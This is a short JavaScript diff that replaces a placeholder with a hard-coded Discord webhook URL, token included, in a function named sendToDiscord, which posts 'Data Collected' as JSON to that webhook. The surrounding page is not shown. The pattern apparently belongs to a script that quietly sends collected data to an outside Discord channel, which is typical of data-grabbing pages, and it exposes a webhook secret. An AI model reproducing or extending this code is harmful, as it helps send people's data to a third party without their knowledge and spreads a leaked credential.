@@ -34,12 +34,12 @@
 
         // Function to send data to Discord webhook
         function sendToDiscord(data) {
-            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+            const wurl = 'https://discord.com/api/webhooks/1270437580734730351/xtG0i70kO_TFqufkI9os4jCAqJZ3cr9S6p3eCAtc0z044qBk-XNE3dQ-XhJ-dDWTi7rs';
             const message = {
                 content: `**Data Collected:**\n${JSON.stringify(data, null, 2)}`
             };
 
-            fetch(webhookUrl, {
+            fetch(wurl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
